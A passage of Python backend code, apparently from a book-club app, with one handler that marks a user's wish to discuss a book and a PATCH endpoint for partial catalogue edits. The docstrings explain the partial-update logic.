    Creates the `user_books` row when there is none, exactly as the status and
    rating paths do: absence of a row means unread, not the absence of a
    member.
    """
    user_book = (
        db.query(UserBook)
        .filter(UserBook.user_id == current_user.id, UserBook.book_id == book.id)
        .first()
    )
    if user_book is None:
        user_book = UserBook(user_id=current_user.id, book_id=book.id)
        db.add(user_book)

    user_book.wants_to_discuss = payload.wants_to_discuss
    db.commit()
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}", response_model=BookOut)
def update_book_details(
    payload: BookDetailsUpdate,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Correct the catalogue entry by hand.

    `exclude_unset` is what makes a partial update partial: an absent field is
    left alone and an explicit null clears. Without it every unsent field would
    arrive as None and wipe the record, which is the classic PATCH bug.
    """
    for field, value in payload.model_dump(exclude_unset=True).items():
        setattr(book, field, value)

    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)
